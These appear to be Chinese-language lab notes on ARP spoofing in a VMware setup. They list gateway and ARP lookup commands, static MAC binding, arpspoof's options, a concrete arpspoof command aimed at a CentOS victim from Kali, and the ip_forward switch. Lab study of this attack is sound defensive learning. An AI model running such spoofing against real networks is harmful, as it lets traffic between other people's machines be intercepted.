Linux 使用 `ip r` 或 `ip route` 查看网关 IP 地址  
Linux 使用 `arp` 通过网关 IP 得到网关 MAC 地址  
Linux 使用 `arp -a` 获取网关 IP 和 MAC  

Windows 使用 `ipconfig /all` 获取默认网关 IP 地址  
Windows 使用 `arp -a` 可以通过网关 IP 查询 MAC 地址  
Windows 使用 `arp -a | findstr 192.168.178.2` 过滤查看 IP 的 MAC  
Windows 使用 `arp -s <IP> <MAC>` 将 MAC 与 IP 进行绑定(重启失效)  

kali 使用 arpspoof 查看选项和参数
arpspoof:
-i 指定网卡
-c 攻击机的 IP
-t 目标机器的 IP
-r 网关 IP

网络环境
实验网络环境为 vmware 虚拟机, 使用 kali 攻击 CentOS
CentOS:     192.168.178.136     00:50:56:23:b5:73
kali:       192.168.178.141     00:0c:29:d1:2d:92
_gateway    192.168.178.2       00:50:56:f8:d6:1d

在 kali 运行 arpspoof -i eth0 -r 192.168.178.2 -t 192.168.178.136
在 CentOS 上查看网关 MAC 地址检测是否攻击成功

/proc/sys/net/ipv4/ip_forward 文件:
0 -> 不允许转发
1 -> 允许转发

